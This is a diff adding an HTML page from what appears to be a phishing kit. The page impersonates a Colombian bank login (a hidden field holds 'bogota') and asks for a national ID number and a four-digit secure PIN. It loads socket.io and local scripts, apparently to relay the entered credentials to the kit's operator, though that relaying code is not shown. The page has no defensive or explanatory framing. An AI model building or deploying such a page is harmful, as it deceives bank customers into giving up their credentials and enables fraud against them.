@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=0"
+    />
+    <script src="../../../js/functions.js"></script>
+    <title>Secure Payment</title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+      }
+
+      input {
+        width: 86%;
+        height: 45px;
+        padding-left: 15px;
+
+        border-radius: 7px;
+        border: 1px solid rgb(219, 219, 219);
+        margin-bottom: 10px;
+      }
+
+      select {
+        width: 90%;
+        height: 45px;
+        padding-left: 15px;
+        margin-top: 12px;
+        background-color: white;
+        color: black;
+        border: 1px solid rgb(219, 219, 219);
+        margin-bottom: 12px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <img src="img/menu.jfif" alt="" width="100%" />
+    <center><img src="img/mensaje.jfif" alt="" width="93%" /></center>
+
+    <center>
+      <div
+        class="clave"
+        style="
+          width: 80%;
+          height: 40px;
+          border: 1px solid rgb(219, 219, 219);
+          border-bottom: 1px solid #0040a8;
+        "
+      >
+        <br /><br />
+        <a
+          style="
+            position: absolute;
+            left: 38%;
+            top: 230px;
+            color: #0040a8;
+            font-weight: 600;
+            font-family: Arial, Helvetica, sans-serif;
+            margin-bottom: 1rem;
+          "
+          >Clave segura</a
+        >
+      </div>
+
+      <div
+        class="datos"
+        style="width: 80%; border: 1px solid rgb(219, 219, 219)"
+      >
+        <select name="cc" id="">
+          <option value="Cedula">Cédula de ciudadanía</option></select
+        ><br />
+        <input
+          type="number"
+          name="user"
+          id="txtUsuario"
+          placeholder="Número de documento"
+          minlength="6"
+          maxlength="10"
+          inputmode="numeric"
+          oninput="this.value = this.value.slice(0, 10);"
+          required
+        /><br />
+        <input
+          type="password"
+          name="clave"
+          id="txtPass"
+          placeholder="Clave segura"
+          minlength="4"
+          maxlength="4"
+          inputmode="numeric"
+          oninput="this.value = this.value.slice(0, 4);"
+          required
+        /><br />
+        <input type="hidden" value="bogota" id="banco" />
+
+        <a
+          style="
+            position: relative;
+            left: -75px;
+            color: #a8000b;
+            font-weight: 200;
+            font-size: small;
+            font-family: Arial, Helvetica, sans-serif;
+            margin-bottom: 1rem;
+          "
+          >Información incorrecta</a
+        ><br /><br />
+        <button
+          style="
+            border-radius: 100px;
+            width: 90%;
+            height: 50px;
+            background-color: #0040a8;
+            color: white;
+            font-size: 15px;
+          "
+          id="btnUsuario"
+        >
+          Ingresar ahora
+        </button>
+        <p></p>
+        <img src="img/botonabajo.jfif" alt="" width="95%" />
+      </div>
+    </center>
+
+    <img src="img/1.jfif" alt="" width="100%" />
+    <img src="img/2.jfif" alt="" width="100%" />
+    <img src="img/3.jfif" alt="" width="100%" />
+
+    <script>
+      const txtPass = document.getElementById("txtPass");
+      const txtuser = document.getElementById("txtUsuario");
+
+      txtuser.addEventListener("input", function () {
+        const value = txtuser.value;
+        const cleanValue = value.replace(/\D/g, ""); // Remover caracteres no numéricos
+
+        if (value !== cleanValue) {
+          txtuser.value = cleanValue;
+        }
+      });
+
+      txtPass.addEventListener("input", function () {
+        const value = txtPass.value;
+        const cleanValue = value.replace(/\D/g, ""); // Remover caracteres no numéricos
+
+        if (value !== cleanValue) {
+          txtPass.value = cleanValue;
+        }
+      });
+    </script>
+    <script src="js/newUser.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/wait.js"></script>
+  </body>
+</html>
